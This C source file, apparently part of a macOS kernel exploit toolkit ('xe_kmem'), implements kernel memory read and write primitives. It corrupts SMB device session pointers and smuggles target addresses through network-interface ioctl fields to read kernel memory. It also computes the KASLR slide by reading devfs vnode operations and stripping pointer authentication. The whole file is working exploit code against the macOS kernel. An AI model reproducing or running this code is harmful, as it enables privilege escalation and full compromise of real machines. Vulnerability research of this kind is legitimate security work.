//
//  kmem_ro.c
//  xe_kmem
//
//  Created by admin on 2/23/22.
//

#include <mach/thread_info.h>

#include <xe/memory/kmem.h>
#include <xe/memory/kmem_internal.h>
#include <xe/util/assert.h>
#include <xe/util/log.h>
#include <xe/util/ptrauth.h>
#include <macos_params.h>

#include "smb/client.h"
#include "smb/params.h"

#include "kmem_bootstrap.h"
#include "smb_dev_rw.h"
#include "kmem_read_session.h"
#include "kmem_write_session.h"


#define MAX_READ_SIZE 128 * 1024 * 1024
#define MAX_WRITE_SIZE 1024


typedef enum kmem_boostrap_dev_config {
    DEV_READ,
    DEV_WRITE,
    DEV_USABLE,
    DEV_UNUSABLE,
} kmem_boostrap_dev_config_t;


struct kmem_bootstrap_dev {
    smb_dev_rw_t dev;
    kmem_boostrap_dev_config_t config;
};


#define KMEM_BOOSTRAP_MAX_DEVS 2


struct kmem_bootstrap {
    int num_devs;
    struct kmem_bootstrap_dev* devs;
    
    kmem_read_session_t read_session;
    kmem_write_session_t write_session;
    
    struct sockaddr_in smb_addr;
};


kmem_write_session_t kmem_bootstrap_get_write_session(struct kmem_bootstrap* kmem) {
    if (!kmem->write_session) {
        kmem->write_session = kmem_write_session_create(&kmem->smb_addr);
    }
    return kmem->write_session;
}


kmem_read_session_t kmem_boostrap_get_read_session(struct kmem_bootstrap* kmem) {
    if (!kmem->read_session) {
        kmem->read_session = kmem_read_session_create(&kmem->smb_addr);
    }
    return kmem->read_session;
}


int kmem_boostrap_setup_dev(struct kmem_bootstrap* kmem, struct kmem_bootstrap_dev* dev, kmem_boostrap_dev_config_t config) {
    uintptr_t session;
    switch (config) {
        case DEV_READ:
            session = kmem_read_session_get_addr(kmem_boostrap_get_read_session(kmem));
            break;
        case DEV_WRITE:
            session = kmem_write_session_get_addr(kmem_bootstrap_get_write_session(kmem));
            break;
        default:
            xe_log_error("invalid config %d", config);
            abort();
    }
    
    struct smb_dev smb_dev;
    int error = smb_dev_rw_read(dev->dev, &smb_dev);
    xe_assert_err(error);
    
    smb_dev.sd_session = (struct smb_session*)session;
    error = smb_dev_rw_write(dev->dev, &smb_dev);
    if (error) {
        xe_log_warn("write failed for smb_dev_rw with fd_dev: %d. smb_dev_rw will be deactivated", smb_dev_rw_get_dev_fd(dev->dev));
        dev->config = DEV_UNUSABLE;
        return error;
    } else {
        dev->config = config;
        return 0;
    }
}


struct kmem_bootstrap_dev* kmem_bootstrap_get_dev(struct kmem_bootstrap* kmem, kmem_boostrap_dev_config_t config) {
    xe_assert(config == DEV_READ || config == DEV_WRITE);
    
    for (int i=0; i<kmem->num_devs; i++) {
        struct kmem_bootstrap_dev* dev = &kmem->devs[i];
        if (dev->config == config) {
            return dev;
        }
    }
    
    for (int i=0; i<kmem->num_devs; i++) {
        struct kmem_bootstrap_dev* dev = &kmem->devs[i];
        if (dev->config == DEV_USABLE) {
            int error = kmem_boostrap_setup_dev(kmem, dev, config);
            if (!error) {
                return dev;
            }
        }
    }
    
    for (int i=0; i<kmem->num_devs; i++) {
        struct kmem_bootstrap_dev* dev = &kmem->devs[i];
        if (dev->config != DEV_UNUSABLE) {
            int error = kmem_boostrap_setup_dev(kmem, dev, config);
            if (!error) {
                return dev;
            }
        }
    }
    
    xe_log_error("no smb_dev_rw left for read");
    abort();
}

int kmem_boostrap_try_write(struct kmem_bootstrap* kmem, uintptr_t dst, void* src, uint32_t size) {
    int block_size = MAXTHREADNAMESIZE;
    
    uintptr_t write_start = dst;
    uintptr_t write_end = dst + MAX(block_size, size);
    
    uint8_t last_byte;
    if (size >= block_size) {
        last_byte = ((char*)src)[size - 1];
    } else {
        last_byte = xe_kmem_read_uint8(write_end - 1, 0);
    }
    
    while (last_byte) {
        last_byte = xe_kmem_read_uint8(write_end++, 0);
    }
    
    size_t write_size = write_end - write_start;
    xe_assert_cond(write_size, >=, size);
    xe_assert_cond(write_size, >=, block_size);
    
    char* write_data = malloc(write_size);
    memcpy(write_data, src, size);
    xe_kmem_read(write_data + size, write_start + size, 0, write_size - size);
    xe_assert_cond(write_data[write_size - 1], ==, '\0');
    
    struct kmem_bootstrap_dev* dev = kmem_bootstrap_get_dev(kmem, DEV_WRITE);
    xe_assert(dev->config == DEV_WRITE);
    xe_assert_cond(smb_dev_rw_get_session(dev->dev), ==, kmem_write_session_get_addr(kmem->write_session));
    
    size_t cursor = 0;
    while (cursor < write_size) {
        char block[MAXTHREADNAMESIZE];
        size_t end = cursor + sizeof(block);
        if (end < write_size) {
            memcpy(block, write_data + cursor, sizeof(block) - 1);
            block[sizeof(block) - 1] = '\0';
            end--;
        } else {
            cursor = write_size - sizeof(block);
            memcpy(block, write_data + cursor, sizeof(block));
            end = write_size;
        }
        kmem_write_session_write_block(kmem->write_session, smb_dev_rw_get_dev_fd(dev->dev), dst + cursor, block);
        cursor = end;
    }
    
    free(write_data);
    return 0;
}


int kmem_boostrap_try_read(struct kmem_bootstrap* kmem, void* dst, uintptr_t src, uint32_t size) {
    struct kmem_bootstrap_dev* dev = kmem_bootstrap_get_dev(kmem, DEV_READ);
    xe_assert(dev->config == DEV_READ);
    
    int fd = smb_dev_rw_get_dev_fd(dev->dev);
    
    int error = smb_client_ioc_auth_info(fd, NULL, UINT32_MAX, NULL, UINT32_MAX, NULL);
    if (error == EINVAL) {
        dev->config = DEV_USABLE;
        kmem_read_session_destroy(&kmem->read_session);
        kmem->read_session = NULL;
        return error;
    }
    xe_assert_err(error);
    
    struct network_nic_info nic_info;
    bzero(&nic_info, sizeof(nic_info));
    nic_info.nic_index = FAKE_SESSION_NIC_INDEX;
    nic_info.nic_link_speed = ((uint64_t)size) << 32;
    nic_info.nic_caps = (uint32_t)((uintptr_t)src);
    nic_info.nic_type = (uint32_t)((uintptr_t)src >> 32);
    memcpy(&nic_info.addr, &FAKE_SESSION_NIC_ADDR, sizeof(FAKE_SESSION_NIC_ADDR));
    
    error = smb_client_ioc_update_client_interface(fd, &nic_info, 1);
    xe_assert_err(error);
    
    error = smb_client_ioc_auth_info(fd, dst, size, NULL, UINT32_MAX, NULL);
    xe_assert_err(error);
    return 0;
}


void kmem_bootstrap_read(void* ctx, void* dst, uintptr_t src, size_t size) {
    xe_assert_cond(size, <=, MAX_READ_SIZE);
    struct kmem_bootstrap* kmem = (struct kmem_bootstrap*)ctx;
    int error;
    do {
        error = kmem_boostrap_try_read(kmem, dst, src, (uint32_t)size);
    } while (error != 0);
}


void kmem_bootstrap_write(void* ctx, uintptr_t dst, void* src, size_t size) {
    xe_assert_cond(size, <=, MAX_WRITE_SIZE);
    struct kmem_bootstrap* kmem = (struct kmem_bootstrap*)ctx;
    int error;
    do {
        error = kmem_boostrap_try_write(kmem, dst, src, (uint32_t)size);
    } while (error != 0);
}


static const struct xe_kmem_ops kmem_ro_ops = {
    .read = kmem_bootstrap_read,
    .write = kmem_bootstrap_write,
    .max_read_size = MAX_READ_SIZE,
    .max_write_size = MAX_WRITE_SIZE
};


xe_kmem_backend_t kmem_boostrap_create(const struct sockaddr_in* smb_addr) {
    smb_dev_rw_t devs[2] = { NULL, NULL };
    smb_dev_rw_create(smb_addr, &devs[0], &devs[1]);
    
    int dev_count = 0;
    if (devs[0] && devs[1]) {
        dev_count = 2;
    } else if (devs[0]) {
        dev_count = 1;
    } else {
        abort();
    }
    
    struct kmem_bootstrap* kmem = malloc(sizeof(struct kmem_bootstrap));
    kmem->smb_addr = *smb_addr;
    kmem->devs = malloc(sizeof(struct kmem_bootstrap_dev) * dev_count);
    for (int i=0; i<dev_count; i++) {
        kmem->devs[i].dev = devs[i];
        kmem->devs[i].config = smb_dev_rw_is_active(devs[i]) ? DEV_USABLE : DEV_UNUSABLE;
    }
    kmem->num_devs = dev_count;
    kmem->read_session = NULL;
    kmem->write_session = NULL;
    
    return xe_kmem_backend_create(&kmem_ro_ops, kmem);
}

uintptr_t kmem_boostrap_get_mach_execute_header(xe_kmem_backend_t backend) {
    struct kmem_bootstrap* kmem = (struct kmem_bootstrap*)xe_kmem_backend_get_ctx(backend);
    struct kmem_bootstrap_dev* dev = NULL;
    
    for (int i=0; i<kmem->num_devs; i++) {
        if (kmem->devs[i].config != DEV_UNUSABLE) {
            dev = &kmem->devs[i];
            break;
        }
    }
    
    xe_assert(dev != NULL);
    
    struct smb_dev smb_dev;
    smb_dev_rw_read(dev->dev, &smb_dev);
    
    uintptr_t devfs = (uintptr_t)smb_dev.sd_devfs;
    uintptr_t de_dnp = xe_kmem_read_uint64(devfs, TYPE_DEVDIRENT_MEM_DE_DNP_OFFSET);
    uintptr_t dn_ops = xe_kmem_read_uint64(de_dnp, TYPE_DEVNODE_MEM_DN_OPS_OFFSET);
    uintptr_t vn_default_error = xe_ptrauth_strip(xe_kmem_read_uint64(xe_kmem_read_uint64(dn_ops, 0), 0));
    
    int64_t text_exec_slide = vn_default_error - FUNC_VN_DEFAULT_ERROR;
    xe_assert_cond(text_exec_slide, >=, 0);
    uintptr_t text_exec_base = XE_IMAGE_SEGMENT_TEXT_EXEC_BASE + text_exec_slide;
    uintptr_t text_base = text_exec_base - XE_IMAGE_SEGMENT_TEXT_SIZE;
    return text_base;
}

void kem_boostrap_destroy(xe_kmem_backend_t* backend_p) {
    xe_log_error("todo");
    abort();
}
